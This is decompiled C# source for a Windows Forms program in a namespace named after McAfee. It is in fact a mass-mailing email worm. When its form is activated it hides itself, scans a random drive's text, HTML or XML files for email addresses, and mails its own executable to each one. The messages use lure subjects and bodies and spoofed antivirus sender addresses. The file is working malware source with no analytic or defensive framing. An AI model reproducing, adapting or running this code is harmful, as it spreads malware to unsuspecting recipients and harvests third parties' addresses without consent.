using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;

namespace Mcafee;

public class Form2 : Form
{
	private IContainer components;

	public Form2()
	{
		InitializeComponent();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
	}

	private void amir(object sender, EventArgs e)
	{
		//IL_0449: Unknown result type (might be due to invalid IL or missing references)
		//IL_0450: Expected O, but got Unknown
		//IL_04a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ad: Expected O, but got Unknown
		((Control)this).Hide();
		try
		{
			for (int i = 0; i < 6; i++)
			{
				string[] array = new string[20]
				{
					"mcafee", "symantec", "Yahoo!", "Norton! ", "Text message", "NOD32", "Important bill!  ", "Message Notify ", "Fax Message", "Protected message",
					"Cum a murit Papa?", "Encrypted document", "Account notify", "E-mail account disabling warning", "E-mail technical support message.", "E-mail warning", "Email account utilization warning.", "Fax Message Received ", "Pentru Ionel", "IranSare2008"
				};
				Random random = new Random();
				int num = random.Next(0, 20);
				string subject = array[num];
				string[] array2 = new string[5] { "AmirCivil.pic.cmd", "register.pif ", "sexy-screensaver.scr ", "fullmessenger.exe", "readme.html.cmd" };
				Random random2 = new Random();
				random2.Next(0, 5);
				string[] array3 = new string[20]
				{
					"nice stuffs i got here... ", "Message Error", "i've got cool stuffs here...  ", "i want you to know how much i care for you... ", "hello! i'm your long, lost friend... ", "kindness is a virtue... ", "sharing files is the essence of living... check this out... ", "hi, friend... here are some nice stuffs that i got from the internet... check it out...  ", "hmmmn... i guess you've forgotten me... but anyways, i wanna make up... here are the files that made me like the internet more... see for yourself...", "one of the files is a virus... can you tell me which one is it? hehehe, i'm only joking... your friend, paul.. ",
					"classroom test of you? ", "old photos about you? ", "i hope thats not true! ", "three files for you to keep... always remember that i'm into deep... i don't know you but i think i'm in love... ", " you know amir_civil?!", "Ioana, sex in grup in camin. Cred ca o stii si ", "another pic, have fun! ... :->", "Credeti ca ar fi mai bine ca Romania sa-si retraga trupele din Irak anul acesta?Deschideti programul Vot, alegeti votul dvs. si vedeti rezultatele.Parerea dvs. conteaza!", "the information is wrong! ", "Credeti ca ar fi mai bine ca Romania sa-si retraga trupele din Irak anul acesta?Deschideti programul Vot, alegeti votul dvs. si vedeti rezultatele.Parerea dvs. conteaza! "
				};
				Random random3 = new Random();
				int num2 = random3.Next(0, 20);
				string body = array3[num2];
				string[] array4 = new string[3] { "*txt", "*html", "*xml" };
				Random random4 = new Random();
				int num3 = random4.Next(0, 3);
				string searchPattern = array4[num3];
				string[] array5 = new string[20]
				{
					"mcafee@yahoo.com", "symantec@yahoo.com", "nod32@yahoo.com", "panda@yahoo.com", "avg@yahoo.com", "password@yahoo.com", "info@yahoo.com", "ebook@yahoo.com", "LongShot@yahoo.com", "pic@yahoo.com",
					"update@yahoo.com", "matt@yahoo.com", "steve@yahoo.com", "smith@yahoo.com", "stan@yahoo.com", "bill@yahoo.com", "bob@yahoo.com", "YourFriend@yahoo.com", " mail@yahoo.com", "ted@yahoo.com"
				};
				Random random5 = new Random();
				int num4 = random5.Next(0, 20);
				string from = array5[num4];
				string[] array6 = new string[5] { "C:\\", "D:\\", "E:\\", "G:\\", "F:\\" };
				Random random6 = new Random();
				int num5 = random6.Next(0, 5);
				string path = array6[num5];
				try
				{
					string[] array7 = new string[1] { "C:\\windows" };
					string[] array8 = array7;
					for (int j = 0; j < array8.Length; j++)
					{
						string[] files = Directory.GetFiles(path, searchPattern);
						string[] array9 = files;
						foreach (string path2 in array9)
						{
							Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");
							FileStream fileStream = new FileStream(path2, FileMode.Open, FileAccess.Read);
							byte[] array10 = new byte[fileStream.Length];
							fileStream.Read(array10, 0, (int)fileStream.Length);
							fileStream.Close();
							foreach (Match item in regex.Matches(Encoding.ASCII.GetString(array10)))
							{
								string to = item.ToString();
								try
								{
									MailMessage val = new MailMessage();
									val.set_From(from);
									val.set_To(to);
									val.set_Cc("info@yahoo.com");
									val.set_Bcc("password@yahoo.com");
									val.set_Subject(subject);
									val.set_Body(body);
									SmtpMail.set_SmtpServer("mx4.mail.yahoo.com");
									val.get_Attachments().Add((object?)new MailAttachment(Application.get_ExecutablePath(), (MailEncoding)1));
									SmtpMail.Send(val);
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 266));
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Form)this).add_Activated((EventHandler)amir);
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
	}
}
